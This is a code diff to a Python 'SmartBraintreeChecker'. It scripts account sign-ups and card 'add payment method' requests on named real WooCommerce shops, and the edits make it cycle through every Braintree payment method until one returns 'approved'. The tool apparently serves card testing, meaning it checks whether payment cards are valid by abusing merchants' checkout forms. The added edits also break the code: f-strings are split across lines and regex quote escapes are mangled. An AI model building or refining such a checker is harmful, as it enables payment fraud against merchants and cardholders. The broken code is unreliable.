@@ -75,7 +75,7 @@ KNOWN_CONFIGS = {
         'register_url': '/customer-account/?action=register',
         'address_url': '/customer-account/edit-address/billing/',
         'payment_url': '/customer-account/add-payment-method/',
-        'payment_method': 'braintree_cc'
+        'payment_method': 'wc_braintree_credit_card'  # Updated to match actual site
     },
     'assurancehomehealthcare.ca': {
         'register_url': '/my-account/',
@@ -203,6 +203,7 @@ class SmartBraintreeChecker:
             'login_nonce': r'name="woocommerce-login-nonce" value="([^"]+)"',
             'edit_address_nonce': r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
             'add_payment_nonce': r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
+            'wc_braintree_nonce': r'name="wc_braintree_credit_card_nonce" value="([^"]+)"',  # Added
             'wp_referer': r'name="_wp_http_referer" value="([^"]+)"'
         }
         for key, pattern in patterns.items():
@@ -326,7 +327,8 @@ class SmartBraintreeChecker:
                 error_msg = f"Registration Form Not Found (404/No Nonce) - {last_error}"
                 logger.error(error_msg)
                 if last_html:
-                    logger.error(f"=== FULL HTML RESPONSE ===\n{last_html}")
+                    logger.error(f"=== FULL HTML RESPONSE ===
+{last_html}")
                 return False, error_msg
             
             tokens = self.extract_tokens(html)
@@ -336,7 +338,8 @@ class SmartBraintreeChecker:
             if not register_nonce and not ur_frontend_form_nonce:
                 error_msg = "Registration Form Not Found (404/No Nonce) - No registration token found"
                 logger.error(error_msg)
-                logger.error(f"=== FULL HTML RESPONSE ===\n{html}")
+                logger.error(f"=== FULL HTML RESPONSE ===
+{html}")
                 return False, error_msg
             
             headers = self.base_headers.copy()
@@ -432,7 +435,8 @@ class SmartBraintreeChecker:
             tokens = self.extract_tokens(html)
             if not tokens.get('edit_address_nonce'):
                 logger.error("No address token found")
-                logger.error(f"=== FULL HTML RESPONSE ===\n{html}")
+                logger.error(f"=== FULL HTML RESPONSE ===
+{html}")
                 return False, "No address token"
             
             headers = self.base_headers.copy()
@@ -520,18 +524,19 @@ class SmartBraintreeChecker:
                 
                 # Extract tokens
                 tokens = self.extract_tokens(html)
-                add_payment_nonce = tokens.get('add_payment_nonce')
+                add_payment_nonce = tokens.get('add_payment_nonce') or tokens.get('wc_braintree_nonce')
                 
                 if not add_payment_nonce:
                     logger.error("No payment nonce found")
-                    logger.error(f"=== FULL PAYMENT PAGE HTML ===\n{html}")
+                    logger.error(f"=== FULL PAYMENT PAGE HTML ===
+{html}")
                     return None, None, "No payment nonce"
                 
                 # Try to extract embedded client token
                 patterns = [
                     r'braintree_client_token\s*=\s*\["([^"]+)"\]',
-                    r'var\s+clientToken\s*=\s*["\']([^"\']+)["\']',
-                    r'["\']clientToken["\']:\s*["\']([^"\']+)["\']'
+                    r'var\s+clientToken\s*=\s*["']([^"']+)["']',
+                    r'["']clientToken["']:\s*["']([^"']+)["']'
                 ]
                 
                 client_token = None
@@ -647,45 +652,51 @@ class SmartBraintreeChecker:
                 'user-agent': self.base_headers['user-agent']
             }
             
-            payment_method = self.detected_config['payment_method']
+            # Try all payment methods in PAYMENT_METHODS
+            for payment_method in PAYMENT_METHODS:
+                try:
+                    # Build form data based on payment method type
+                    if payment_method == 'braintree_cc':
+                        data = {
+                            'payment_method': 'braintree_cc',
+                            'braintree_cc_nonce_key': payment_token,
+                            'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
+                            'braintree_cc_3ds_nonce_key': '',
+                            'woocommerce-add-payment-method-nonce': add_payment_nonce,
+                            '_wp_http_referer': self.detected_config['payment_url'],
+                            'woocommerce_add_payment_method': '1'
+                        }
+                    else:
+                        data = {
+                            'payment_method': payment_method,
+                            f'wc-{payment_method}-card-type': 'visa',
+                            f'wc_{payment_method}_payment_nonce': payment_token,
+                            f'wc-{payment_method}-device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
+                            f'wc-{payment_method}-tokenize-payment-method': 'true',
+                            'woocommerce-add-payment-method-nonce': add_payment_nonce,
+                            '_wp_http_referer': self.detected_config['payment_url'],
+                            'woocommerce_add_payment_method': '1'
+                        }
+                    
+                    encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
+                    
+                    async with self.session.post(
+                        f"{self.base_url}{self.detected_config['payment_url']}",
+                        headers=headers,
+                        data=encoded
+                    ) as response:
+                        html = await response.text()
+                        parsed = self.site_response(html)
+                        
+                        if 'approved' in parsed.lower() or 'success' in parsed.lower():
+                            return {'success': True, 'response': parsed, 'payment_method': payment_method}
+                        else:
+                            continue  # Try next payment method
+                    
+                except Exception as e:
+                    continue  # Try next payment method
             
-            # Build form data based on payment method type
-            if payment_method == 'braintree_cc':
-                data = {
-                    'payment_method': 'braintree_cc',
-                    'braintree_cc_nonce_key': payment_token,
-                    'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
-                    'braintree_cc_3ds_nonce_key': '',
-                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
-                    '_wp_http_referer': self.detected_config['payment_url'],
-                    'woocommerce_add_payment_method': '1'
-                }
-            else:
-                data = {
-                    'payment_method': payment_method,
-                    f'wc-{payment_method}-card-type': 'visa',
-                    f'wc_{payment_method}_payment_nonce': payment_token,
-                    f'wc_{payment_method}_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
-                    f'wc-{payment_method}-tokenize-payment-method': 'true',
-                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
-                    '_wp_http_referer': self.detected_config['payment_url'],
-                    'woocommerce_add_payment_method': '1'
-                }
-            
-            encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
-            
-            async with self.session.post(
-                f"{self.base_url}{self.detected_config['payment_url']}",
-                headers=headers,
-                data=encoded
-            ) as response:
-                html = await response.text()
-                parsed = self.site_response(html)
-                
-                if 'approved' in parsed.lower() or 'success' in parsed.lower():
-                    return {'success': True, 'response': parsed}
-                else:
-                    return {'success': False, 'response': parsed}
+            return {'success': False, 'response': 'All payment methods failed'}
         except Exception as e:
             return {'success': False, 'response': str(e)[:50]}
     
